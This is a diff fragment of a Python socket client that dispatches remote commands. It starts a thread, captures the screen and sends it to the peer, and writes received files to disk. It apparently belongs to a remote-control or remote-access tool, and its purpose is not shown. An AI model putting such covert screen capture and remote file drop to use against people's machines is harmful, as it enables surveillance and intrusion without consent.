@@ -31,7 +31,8 @@ try:
         elif data == "2" and not th.is_alive():
             th.start()
         elif data == "3":
-            client.send(pyautogui.screenshot().tobytes())
+            pyautogui.screenshot().save("screen.png")
+            client.sendfile("screen.png")
             client.send("end".encode())
         elif "img" in data:
             with open(data.split(" ")[1],"wb") as file:
